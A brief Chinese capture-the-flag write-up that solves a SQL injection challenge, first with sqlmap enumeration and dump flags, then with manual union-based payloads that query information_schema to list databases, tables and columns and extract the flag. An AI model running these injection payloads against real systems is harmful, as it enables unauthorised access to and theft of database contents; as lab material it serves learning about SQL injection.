## 看起来有点简单!
Sql 注入题,直接用 Sqlmap 就能搞定

1. `--current-db` 发现库名为 my_db
2. `-D my_db --tables` 发现表名为 thiskey
3. `-D my_db -T thiskey --columns` 发现字段名为 k0y
4. `-D my_db -T thiskey -C k0y --dump` 得到Flag :  whatiMyD91dump

手工注入: 

1. `id=1'` 报错发现数据库类型为 MySQL 
2. `id=1 and 1=1` 与 `id=1 and 1=2` 回显不同,判断存在注入点
3. `id=1 order by 1` 3 的时候报错,说明字段数为 2
4. `id=1 union select 1,schema_name  from information_schema.schemata` 查询数据库名称发现 my_db 和 test 两个数据库
5. `id=1 union select 1,table_name from information_schema.tables where table_schema=my_db` 查询数据库中的表名 thiskey
6. `id=1 union select 1,column_name from information_schema.columns where table_schema='my_db'` 查询表中字段名,发现 k0y
7. `id=1 union select 1,k0y from thiskey` 得到Flag : whatiMyD91dump

<!--stackedit_data:
eyJoaXN0b3J5IjpbLTYxOTMwODI1NF19
-->